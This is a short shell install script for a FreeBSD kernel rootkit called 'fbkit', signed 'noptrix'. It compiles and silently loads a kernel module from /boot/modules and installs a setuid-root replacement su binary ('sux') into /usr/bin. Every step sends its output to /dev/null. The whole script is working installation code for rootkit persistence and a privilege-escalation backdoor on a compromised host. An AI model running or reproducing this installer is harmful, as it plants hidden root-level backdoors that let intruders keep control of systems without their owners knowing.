#!/bin/sh
#
# install.sh
#
# pr1v4te m4t3ri4l - d0n't publ1sh 0r 1 w1ll pwn y0u!
#
# by noptrix

# fbkit
echo "[*] compingling fbkit..."
cd src/kit/ &&
make > /dev/null 2>&1 &&
mv fbkit.ko /boot/modules/ &&
echo "[*] loading fbkit..."
kldload /boot/modules/fbkit.ko > /dev/null 2>&1

# sux
echo "[*] compiling sux..."
cd ../sux/ &&
gcc -o sux su.c -lpam -lutil > /dev/null 2>&1 &&
chmod 4555 sux &&
echo "[*] installing sux..."
mv sux /usr/bin/ &&
cd ..

echo "[*] we are finished, go ahead!"

# EOF
